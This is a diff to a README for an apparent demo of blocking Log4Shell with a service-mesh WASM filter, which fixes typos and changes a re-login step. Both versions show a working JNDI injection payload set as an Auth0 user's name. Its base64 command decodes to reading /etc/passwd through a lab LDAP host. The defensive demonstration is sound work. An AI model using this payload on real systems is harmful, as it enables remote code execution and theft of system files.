@@ -116,8 +116,8 @@ demonstrate the attach, let's inject some malicious payloads in the token by set
 
 * In the Auth0 amnagement console, go to **Users Management > Users**. Select your user and **Edit** the **Name** field.
   Put the following value and save: `${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}`
-* Open a new Browser window in incognito mode (to make sure there are no cookies, etc) adn log in again. You'll see a normal
-  output:
+* In the browser, go to the `/logout` path to go back to the login screen to get a new token.
+* Log in again. You'll see a normal output:
   ```
   Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
   Accessing: /
@@ -173,7 +173,7 @@ $ envsubst < config/wasm-patch.yaml | kubectl apply -f -
 ```
 
 The [patch file](config/wasm-patch.yaml) sets the `selectors` so that the patch is deployed only to Java applications, and it instructs
-the mesh to apply the WASM filter to every HTTP request. We can now trefresh the page and this time we'll see the following:
+the mesh to apply the WASM filter to every HTTP request. We can now refresh the page and this time we'll see the following:
 
 ```
 Access Denied
